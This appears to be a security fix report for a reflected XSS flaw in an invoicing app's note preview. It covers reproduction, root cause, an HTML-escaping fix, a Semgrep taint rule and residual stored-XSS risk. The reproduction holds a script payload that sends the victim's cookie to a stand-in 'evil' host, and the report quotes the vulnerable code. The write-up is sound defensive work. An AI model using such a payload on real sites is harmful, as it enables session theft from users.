# Fix: reflected XSS in note preview  (CWE-79 / OWASP A03)

**Impact / business risk.**
A crafted note is reflected into an HTML response and executes in the victim's browser:
session/cookie theft, actions taken as the victim, credential capture via a fake form. In an
invoicing app that means one user's script running in another user's authenticated session.

**Reproduction.**
```
POST /invoices/1/note/preview
{ "note": "<script>fetch('//evil/'+document.cookie)</script>" }
```
The response is `text/html` containing the `<script>` verbatim. Automated proof:
`tests/security/xss.test.ts`.

**Root cause.**
Request input is interpolated into an HTML body with no output encoding:
```ts
const note = req.body?.note;
res.send(`<!doctype html><div class="note-preview">${note}</div>`);   // text/html
```
Express serves a string response as `text/html`, so the browser parses and runs the markup.

**Fix.**
Encode on output — escape HTML metacharacters so the payload renders as inert text:
```ts
import { escapeHtml } from '../security/html';
res.send(`<!doctype html><div class="note-preview">${escapeHtml(note)}</div>`);
```
See `fix.diff`. After the fix the `<`/`>` become `&lt;`/`&gt;`; the exploit test flips from
"raw tag present" to "escaped entity present, raw tag absent".

**Prevention (so it can't come back).**
Custom Semgrep rule `xss-user-input-in-html-response` (taint mode) tracks
`req.body/query/params` into `res.send`/`res.write`/`res.end` sinks and treats
`escapeHtml(...)` / `sanitizeHtml(...)` / `DOMPurify.sanitize(...)` as sanitizers. It runs in
CI — any HTML response built from unencoded request input fails the build.

**Detection metric.**
- Custom rule: **fires** on the raw `res.send(\`…${note}…\`)`, **silent** once wrapped in
  `escapeHtml(...)`.
- Community `p/typescript` / `p/owasp-top-ten`: _[measure and record in RESULTS.md]_.

**Residual risk / notes.**
- **Stored XSS is a blind spot of this rule.** Persisting the note (`UPDATE invoices SET
  note = ?`) and rendering it later from the DB is the same bug class, but the rule's taint
  sources are `req.*` — it cannot follow a value that round-trips through SQLite across two
  HTTP requests. Static intra-request taint can't model that; catching stored XSS needs a
  sink-focused rule (flag *any* unencoded interpolation into an HTML sink) or DB-aware taint.
  Hence the rule's **MEDIUM** confidence.
- `escapeHtml` is correct for **HTML text/element** context only. It does not make input safe
  for an unquoted attribute, a `href`/`src` URL, inline JS, or inline CSS. Those contexts need
  context-specific encoders or a templating engine that auto-escapes.
